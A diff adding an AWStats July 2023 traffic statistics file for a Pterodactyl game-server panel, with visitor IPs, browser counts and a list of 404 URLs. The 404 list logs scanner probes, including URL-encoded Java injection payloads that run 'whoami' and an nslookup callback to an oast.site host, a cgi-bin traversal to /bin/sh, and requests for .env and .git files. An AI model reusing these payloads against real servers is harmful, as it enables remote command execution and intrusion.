@@ -1,0 +1,596 @@
+AWSTATS DATA FILE 7.8 (build 20200416)
+# If you remove this file, all statistics for date 202307 will be lost/reset.
+# Last config file used to build this data file was /home/warceu/tmp/awstats/ssl/awstats.panel.warceuproject.dev.conf.
+
+# Position (offset in bytes) in this file for beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 28
+POS_GENERAL 2022                
+POS_TIME 2709                
+POS_VISITOR 13099               
+POS_DAY 16641               
+POS_DOMAIN 3518                
+POS_LOGIN 3872                
+POS_ROBOT 4027                
+POS_WORMS 4391                
+POS_EMAILSENDER 4522                
+POS_EMAILRECEIVER 4665                
+POS_SESSION 17002               
+POS_SIDER 17208               
+POS_FILETYPES 4800                
+POS_DOWNLOADS 5075                
+POS_OS 5158                
+POS_BROWSER 5371                
+POS_SCREENSIZE 6045                
+POS_UNKNOWNREFERER 6119                
+POS_UNKNOWNREFERERBROWSER 6905                
+POS_ORIGIN 7536                
+POS_SEREFERRALS 7676                
+POS_PAGEREFS 7820                
+POS_SEARCHWORDS 8062                
+POS_KEYWORDS 8214                
+POS_MISC 2372                
+POS_ERRORS 8273                
+POS_CLUSTER 3728                
+POS_SIDER_404 8481                
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20230729121555 1080 253643 9432646157591
+FirstTime 20230710152818
+LastTime 20230729121552
+LastUpdate 20230729121654 1080 0 1050 30 0
+TotalVisits 117                 
+TotalUnique 89                  
+MonthHostsKnown 0                   
+MonthHostsUnknown 89                  
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 10
+TotalMisc 0 0 0
+PDFSupport 0 0 0
+JavaEnabled 0 0 0
+DirectorSupport 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+QuickTimeSupport 0 0 0
+RealPlayerSupport 0 0 0
+JavascriptDisabled 0 0 0
+FlashSupport 0 0 0
+AddToFavourites 0 33 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 0 0 0 139 145 13480
+1 6 7 18097 156 170 16978
+2 3 3 2217 150 156 11058
+3 32 37 29448 155 167 11407
+4 19 24 729160 426 442 43825
+5 3 3 10326 186 193 17122
+6 44 45 229926 140 154 21142
+7 52 87 3713272 288 299 159391
+8 179 179 1729500 463 476 56694
+9 78 78 246708 327 336 29596
+10 60 63 787400 523 535 43299
+11 6 6 5663 220 226 13681
+12 66 102 4575378 265 282 44929
+13 38 44 924272 263 271 17609
+14 22 30 1043462 152 158 13630
+15 60 90 2205603 235 274 23581
+16 22 23 91689 116 118 9921
+17 16 46 884131 242 249 22848
+18 39 40 81876 279 286 26205
+19 13 35 1234842 145 152 13101
+20 44 44 247029 228 234 21598
+21 19 19 41188 152 159 8885
+22 2 3 4329 313 330 31442
+23 0 0 0 113 120 11068
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 25 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 10
+id 562 730 18524254
+in 173 173 103082
+us 48 63 133750
+ru 21 21 31930
+ca 7 7 16547
+cn 5 6 13308
+gb 3 3 7226
+sc 2 3 2982
+de 1 1 1892
+hk 1 1 545
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 25 first Hits must be first (order not required for others)
+BEGIN_ROBOT 6
+Go\-http\-client/ 12 6387 20230729100236 0
+no_user_agent 8 13252 20230729121551 0
+curl 5 5918 20230728120514 0
+(firefox/)([0-9]\.|[0-1][0]\.) 3 2982 20230728124231 0
+unknown 2 52 20230729015031 2
+Discordbot/ 2 3784 20230728122852 0
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 12
+svg 7 76830 0 0
+js 81 9826687 0 0
+cgi 2 13928 0 0
+map 3 1626582 0 0
+png 51 144516 0 0
+txt 2 3784 0 0
+Unknown 634 5187636 0 0
+css 44 1790702 0 0
+html 161 151553 0 0
+json 21 9514 0 0
+cc 1 1892 0 0
+env 1 1892 0 0
+END_FILETYPES
+
+# Downloads - Hits - Bandwidth
+BEGIN_DOWNLOADS 1
+/.well-known/security.txt 2 0 3784
+END_DOWNLOADS
+
+# OS ID - Hits
+BEGIN_OS ID - Hits - Pages 11
+android 242 177
+linuxubuntu 29 12
+macosx15 4 4
+linux 15 12
+macosx 1 1
+Unknown 219 203
+win10 490 406
+win7 4 4
+macosx9 1 1
+android10 2 2
+macosx7 1 1
+END_OS
+
+# Browser ID - Hits - Pages
+BEGIN_BROWSER 30
+chrome115.0.0.0 348 269
+chrome5.0.342.7 1 1
+chrome103.0.5060.114 2 2
+chrome114.0.0.0 110 105
+firefox73.0 2 2
+edge14 1 1
+chrome70.0.3538.77 2 2
+chrome81.0.4044.129 1 1
+chrome11.0.669.0 1 1
+chrome108.0.0.0 7 7
+chrome92.0.4515.131 160 94
+firefox115.0 28 11
+chrome101.0.4951.41 1 1
+mozilla 25 10
+chrome86.0.4 7 5
+chrome78.0.3904.108 10 10
+chrome87.0.4280.141 83 83
+chrome33.0.1750.152 1 1
+firefox114.0 1 1
+Unknown 183 182
+chrome83.0.331 1 1
+chrome96.0.4664.110 4 4
+chrome11.0.694.0 1 1
+chrome60.0.3112.113 11 11
+firefox65.0 1 1
+firefox110.0 1 1
+chrome66.0.3359.117 1 1
+firefox83.0 1 1
+chrome49.0.2623.112 2 2
+netscape5.0 11 11
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 9
+Mozilla/5.0 20230729061214
+Expanse,_a_Palo_Alto_Networks_company,_searches_across_the_global_IPv4_space_multiple_times_per_day_to_identify_customers&#39;_presences_on_the_Internet._If_you_would_like_to_be_excluded_from_our_scans,_please_send_IP_addresses/domains_to:_scaninfo@paloaltonetworks.com 20230729092627
+WhatsApp/2.23.14.79_A 20230728155001
+Pterodactyl_Wings/v1.11.7_(id:JoqZl319x0po9EOr) 20230729101602
+Pterodactyl_Wings/v1.11.7_(id:u1FgjOU2BxbWCmhj) 20230729081015
+python-requests/2.31.0 20230729073025
+Mozilla/5.0_(compatible;_CensysInspect/1.1;__https://about.censys.io/) 20230729121554
+Mozilla/5.0_zgrab/0.x 20230729061359
+Pterodactyl_Wings/v1.11.7_(id:b6ZSSpPpwAgaaQp2) 20230729100514
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 6
+Pterodactyl_Wings/v1.11.7_(id:JoqZl319x0po9EOr) 20230729101602
+WhatsApp/2.23.14.79_A 20230728155001
+Pterodactyl_Wings/v1.11.7_(id:u1FgjOU2BxbWCmhj) 20230729081015
+Expanse,_a_Palo_Alto_Networks_company,_searches_across_the_global_IPv4_space_multiple_times_per_day_to_identify_customers&#39;_presences_on_the_Internet._If_you_would_like_to_be_excluded_from_our_scans,_please_send_IP_addresses/domains_to:_scaninfo@paloaltonetworks.com 20230729092627
+Pterodactyl_Wings/v1.11.7_(id:b6ZSSpPpwAgaaQp2) 20230729100514
+python-requests/2.31.0 20230729073025
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 463 481
+From1 0 0
+From2 0 0
+From3 24 24
+From4 336 503
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 0
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 25 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 3
+https://103.219.251.189 14 14
+https://103.219.251.189:443 9 9
+http://103.219.251.189:5000 1 1
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 0
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 25 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 0
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 11
+206 2 126247
+504 143 23166
+500 89 3847
+302 4190 287728
+404 1198 154918
+400 12 22704
+301 1 245
+204 50 0
+429 25 425
+503 33 0
+403 5 0
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referrer
+BEGIN_SIDER_404 127
+/Portal0000.htm 1 -
+/2020/wp-includes/wlwmanifest.xml 2 -
+/admin/nodes/view/2/system-information 22 https://panel.warceuproject.dev/admin/nodes/view/2
+/assets/vendor/bootstrap-icons/bootstrap-icons.css 1 https://panel.warceuproject.dev/
+/ReportServer 2 -
+/.well-known/pki-validation/C2A00F319E1F18795CC830A27115D8B1.txt 1 -
+/site/wp-includes/wlwmanifest.xml 18 -
+/nmaplowercheck1689847733 1 -
+/wsman 1 http://103.219.251.189:80/wsman
+/ 289 -
+/resolve 2 -
+/.git/HEAD 1 -
+/index.php 9 -
+/wp-login.php 1 http://www.google.com.hk
+/dns-query 14 -
+/owa/auth/logon.aspx 39 -
+/scripts/WPnBr.dll 1 -
+/showLogin.cc 1 -
+/api/sonicos/tfa 1 http://103.219.251.189:80/api/sonicos/tfa
+/geoserver 4 -
+/actuator/gateway/routes 7 -
+/fNp8 1 -
+/default.jsa 1 -
+/media/wp-includes/wlwmanifest.xml 16 -
+/static/admin/javascript/hetong.js 4 -
+/Autodiscover/Autodiscover.xml 8 -
+/menu.php 1 -
+/pools/default/buckets 1 -
+/.env 25 -
+/autodiscover/autodiscover.json 16 -
+/mifs/. 6 https://103.219.251.189:443
+/sito/wp-includes/wlwmanifest.xml 18 -
+/app 7 -
+/functionRouter 1 -
+/a 1 -
+/version 5 -
+/website/wp-includes/wlwmanifest.xml 18 -
+/SiteLoader 1 -
+/start.html 1 -
+/actuator/health 6 -
+/_ignition/execute-solution 7 -
+/auth1.html 1 http://103.219.251.189:80/auth1.html
+/eT9j 1 -
+/news/wp-includes/wlwmanifest.xml 18 -
+/panel.warceuproject.dev 3 -
+/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X- 1 -
+/solr/admin/info/system 2 http://103.219.251.189:80/solr/admin/info/system
+/cms/wp-includes/wlwmanifest.xml 18 -
+/.git/config 21 -
+/validate.js 1 https://panel.warceuproject.dev/
+/sitemap.xml 33 -
+/GYiS 1 -
+/assets/css/style.css 1 https://panel.warceuproject.dev/
+/.well-known/pki-validation/7C9A8F3F39B574AC1E1410A28B20F4F8.txt 1 -
+/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application 5 -
+/axis2/ 2 -
+/index.jsp 1 -
+/geoserver/web/ 9 -
+/_profiler/phpinfo 6 -
+/owa/auth.owa 1 -
+/home.pl 1 -
+/admin/nodes/view/3/system-information 1 https://panel.warceuproject.dev/admin/nodes/view/3
+/download/file.ext 1 -
+/console/ 8 -
+/.well-known/pki-validation/C7623C8019E7814E5D38668AE27A85F6.txt 1 -
+/home.jsp 1 -
+/tomcatwar.jsp 2 -
+/cgi-bin/../../../../bin/sh 6 -
+/admin/nodes/view/1/system-information 46 https://panel.warceuproject.dev/admin/nodes/view/1
+/phpmyadmin 1 -
+/sysinfo 45 -
+/admin/nodes/view/1 1 https://panel.warceuproject.dev/admin/nodes
+/sysinfo/sitemap.xml 2 -
+/xmlrpc.php 18 -
+/web/wp-includes/wlwmanifest.xml 18 -
+/readme.txt 1 -
+/customer-session 1 -
+/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js 1 https://panel.warceuproject.dev/
+/ab2g 10 -
+/.well-known/security.txt 13 -
+/test/wp-includes/wlwmanifest.xml 18 -
+/robots.txt 62 -
+/2018/wp-includes/wlwmanifest.xml 16 -
+/dasdasd 1 -
+/blog/wp-includes/wlwmanifest.xml 18 -
+/ab2h 9 -
+/owa/auth/x.js 4 -
+/wp-includes/wlwmanifest.xml 18 -
+/shop/wp-includes/wlwmanifest.xml 18 -
+/ghksjdghdfksanitycheckqwerjlhfgjksdghlid 1 -
+/Public/home/js/check.js 4 -
+/assets/vendor/bootstrap/css/bootstrap.min.css 1 https://panel.warceuproject.dev/
+/core/.env 3 -
+/api/sonicos/auth 1 http://103.219.251.189:80/api/sonicos/auth
+/2019/wp-includes/wlwmanifest.xml 18 -
+/__Additional 1 -
+/pfblockerng/www/index.php 2 -
+/config.json 1 -
+/server-status 2 -
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 19 -
+/axis2-admin/ 2 -
+/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20ciquggiv290kg14tck90u6brtmzh1gqae.oast.site%22%29%7D/ 1 -
+/sslvpnLogin.html 1 http://103.219.251.189:80/sslvpnLogin.html
+/wordpress/wp-includes/wlwmanifest.xml 18 -
+/info.php 1 -
+/axis2/axis2-admin/ 2 -
+/t4 8 -
+/mPlayer 1 -
+/CSS/Miniweb.css 1 -
+/wp/wp-includes/wlwmanifest.xml 18 -
+/HNAP1 1 -
+/telescope/requests 1 -
+/400.shtml 2 http://103.219.251.189:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+/.git/ 1 -
+/mgmt/tm/util/bash 2 -
+/wp1/wp-includes/wlwmanifest.xml 18 -
+/favicon-32x32.png 3 http://103.219.251.189/favicon-32x32.png
+/owa/ 3 -
+/auth.html 1 http://103.219.251.189:80/auth.html
+/sdk 1 -
+/login 4 -
+/index.html 1 -
+/sysinfo/robots.txt 2 -
+/level/15/exec/-/sh/run/CR 1 -
+/vpn/index.html 1 -
+/test 2 -
+/wp2/wp-includes/wlwmanifest.xml 18 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]
+# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished
+# The 25 first Hits must be first (order not required for others)
+BEGIN_VISITOR 89
+36.72.217.202 198 231 6435633 20230729102516
+103.219.251.189 169 169 93964 20230729101602
+36.72.214.208 154 262 9423103 20230728201753
+36.72.216.182 76 76 181648 20230718142007
+36.72.213.157 30 30 97464 20230719154344
+36.72.217.95 29 34 14971 20230711042721
+36.72.213.20 28 28 9621 20230722070945
+36.72.214.88 14 14 15118 20230720152311
+36.72.214.69 10 10 8360 20230727062022
+213.109.202.66 9 9 16493 20230721185359
+125.163.13.108 8 25 1641387 20230728175719
+89.175.184.250 4 4 98 20230710172339
+103.3.221.15 3 8 688209 20230729040237
+34.254.53.125 3 3 147 20230710181809
+36.72.216.71 3 3 2452 20230729120614 20230729120613 /api/client
+180.245.166.37 2 2 279 20230711040121
+185.180.143.80 2 2 3784 20230729092421
+171.67.70.229 2 2 0 20230710153048
+167.172.112.34 2 2 3784 20230729061214
+118.123.105.90 2 3 5879 20230721042433
+64.227.177.67 2 2 3784 20230728183610
+36.72.214.13 2 2 1672 20230722111043
+185.180.140.4 2 2 3784 20230728160912
+171.67.70.233 2 2 98 20230710193048
+103.56.61.144 2 2 6884 20230719070804
+165.154.119.37 1 1 3442 20230719013752
+23.251.102.74 1 1 1892 20230728193242
+198.235.24.75 1 1 3442 20230719111653
+154.28.229.20 1 1 49 20230710155431
+45.156.128.2 1 1 1892 20230728174237
+47.88.87.97 1 1 49 20230711033743
+107.170.253.8 1 1 1892 20230728210453
+36.72.216.249 1 1 1169 20230716122747
+35.203.211.36 1 1 3442 20230719060504
+36.72.217.111 1 1 545 20230721134833
+45.156.128.12 1 1 1892 20230728134929
+65.49.20.66 1 1 545 20230721081113
+205.210.31.77 1 1 1892 20230729092627
+103.147.72.25 1 1 3442 20230718122813
+45.83.64.127 1 1 3442 20230719135447
+162.142.125.216 1 1 545 20230720213030
+198.235.24.177 1 1 1892 20230729035412
+162.142.125.223 1 4 14256 20230729075603
+83.97.73.87 1 1 1892 20230729104908
+47.88.93.234 1 1 49 20230711035149
+185.180.143.18 1 1 1892 20230729032728
+167.248.133.185 1 4 14256 20230728152827
+205.210.31.137 1 1 1892 20230729010135
+35.203.211.232 1 1 1892 20230729044853
+192.241.236.53 1 1 1892 20230729061359
+185.180.143.189 1 1 3442 20230719134334
+165.231.182.22 1 1 545 20230721093753
+67.205.147.90 1 1 1892 20230728125132
+205.185.127.30 1 1 3442 20230718211752
+162.142.125.12 1 4 14256 20230729100258
+45.156.129.12 1 1 1892 20230729044702
+35.203.211.62 1 1 545 20230720172734
+34.77.127.183 1 1 1892 20230729073025
+162.243.132.16 1 1 1892 20230729044528
+167.94.145.59 1 1 545 20230721112932
+167.248.133.127 1 1 3442 20230718184017
+198.199.110.78 1 1 1892 20230728212335
+162.216.149.66 1 1 545 20230721034136
+198.235.24.222 1 1 3442 20230719095110
+167.248.133.49 1 1 545 20230720211736
+120.0.52.70 1 1 545 20230721160639
+209.141.36.231 1 1 3442 20230718211733
+180.246.27.212 1 1 951 20230717205057
+64.226.84.18 1 1 1892 20230728214344
+205.185.118.120 1 1 545 20230721153056
+185.233.19.230 1 1 545 20230720152401
+193.118.55.162 1 1 3442 20230719151238
+167.94.146.58 1 4 14256 20230729121552 20230729121552 /
+128.14.134.134 1 1 3442 20230718174031
+162.142.125.226 1 1 3442 20230718125528
+154.28.229.72 1 1 49 20230710161512
+209.141.51.222 1 1 545 20230721153056
+216.218.206.67 1 1 3442 20230719033310
+162.142.125.13 1 4 14256 20230728151215
+134.209.47.196 1 1 545 20230721101655
+103.27.108.241 1 1 545 20230720205841
+64.227.154.17 1 1 3442 20230719051402
+109.237.98.226 1 1 1892 20230728220156
+104.164.173.204 1 1 0 20230710153032
+159.65.188.21 1 1 1892 20230729101318
+162.216.149.5 1 1 3442 20230718154258
+198.235.24.196 1 1 545 20230720204145
+36.72.216.222 2 2 1672 20230726142950
+168.80.174.2 1 2 2437 20230721014340
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 13
+20230710 39 39 2240 10
+20230711 28 33 15103 4
+20230716 1 1 1169 1
+20230717 39 39 57793 2
+20230718 49 49 162668 16
+20230719 55 55 153341 17
+20230720 11 11 5995 10
+20230721 12 12 6540 12
+20230722 10 10 9739 3
+20230726 9 9 7524 2
+20230727 3 3 2508 1
+20230728 190 322 11126718 19
+20230729 377 425 7284178 20
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 7
+15mn-30mn 2
+1h+ 9
+5mn-15mn 5
+0s-30s 92
+2mn-5mn 2
+30mn-1h 4
+30s-2mn 1
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 25 first Pages must be first (order not required for others)
+BEGIN_SIDER 44
+/api/remote/servers 169 93964 2 2
+/ 161 151553 48 37
+/sysinfo 136 340377 58 61
+/admin/nodes 57 860754 0 2
+/admin/nodes/view/2/settings 27 697162 0 0
+/admin/nodes/view/1/settings 26 670047 0 0
+/admin/nodes/view/1 24 428866 0 0
+/admin/nodes/view/1/configuration 22 325358 0 1
+/admin/nodes/view/1/system-information 20 2000 0 0
+/admin/nodes/view/2/configuration 20 295824 0 0
+/admin/nodes/view/2 19 339041 0 0
+/api/client 17 2193 0 0
+/locales/locale.json 14 4474 0 3
+/admin 11 138734 1 0
+/admin/nodes/view/2/settings/token 11 759 0 0
+/admin/mounts 10 171868 0 0
+/favicons/manifest.json 7 5040 0 1
+/admin/nodes/new 7 153047 0 0
+/auth/login 7 8470 1 0
+/admin/settings 6 92744 0 0
+/admin/nodes/view/2/allocation 6 144696 0 0
+/admin/nodes/view/2/servers 6 76685 0 0
+/admin/nodes/view/2/system-information 5 500 0 0
+/admin/nodes/view/3 4 71068 0 0
+/themes/pterodactyl/vendor/bootstrap/bootstrap.min.css.map 3 1626582 0 0
+/ab2g 1 1892 1 0
+/admin/nodes/view/1/settings/token 2 138 0 0
+/showLogin.cc 1 1892 0 1
+/admin/nodes/view/3/allocation 2 48570 0 0
+/admin/nodes/view/3/settings 1 25546 0 0
+/ReportServer 1 1892 1 1
+/cgi-sys/defaultwebpage.cgi 2 13928 1 1
+/admin/nodes/view/3/configuration 1 14792 0 0
+/.env 1 1892 1 1
+/admin/nodes/view/3/servers 1 12781 0 0
+/t4 2 3784 1 2
+/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application 2 3784 2 2
+/api/client/account/activity 1 1567 0 0
+/admin/servers 2 26112 0 0
+/admin/locations 2 28676 0 0
+/admin/nests 2 35928 0 0
+/admin/nodes/view/1/allocation 1 24538 0 0
+/admin/databases 1 16413 0 0
+/admin/locations/view/1 2 27066 0 0
+END_SIDER
